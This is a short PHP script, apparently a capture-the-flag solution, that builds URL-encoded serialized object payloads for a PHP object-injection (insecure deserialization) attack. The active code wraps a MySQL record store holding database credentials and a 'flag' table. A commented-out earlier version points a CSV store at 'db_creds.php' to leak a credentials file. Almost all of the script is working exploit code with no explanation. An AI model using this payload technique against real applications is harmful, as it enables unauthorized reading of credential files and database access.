<?php

/* class Albums{
    private $store;
    public function __construct($store) {
        $this->store = $store;
    }
}

class CsvRecordStore{
    private $file;
    public function __construct($file) {
        $this->file = $file;
    }
}

$leak_db_creds = new Albums(new CsvRecordStore('db_creds.php'));
$enc_leak = urlencode(serialize($leak_db_creds));

echo $enc_leak; */
class Albums{
    private $store;
    public function __construct($store) {
        $this->store = $store;
}
}

class MysqlRecordStore{
    private $mysqli;
    private $table;
    private $host;
    private $user;
    private $pass;
    private $db;

    public function __construct($host, $user, $pass, $db, $table) {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->db = $db;
        $this->mysqli = new mysqli($host, $user, $pass, $db);
        $this->table = $table;
    }
}

$leak_db_creds = new Albums(new MysqlRecordStore('mysql','user','yeah_im_different','challenge', 'flag'));
$enc_leak = urlencode(serialize($leak_db_creds));

echo $enc_leak;

echo "   End"
?>
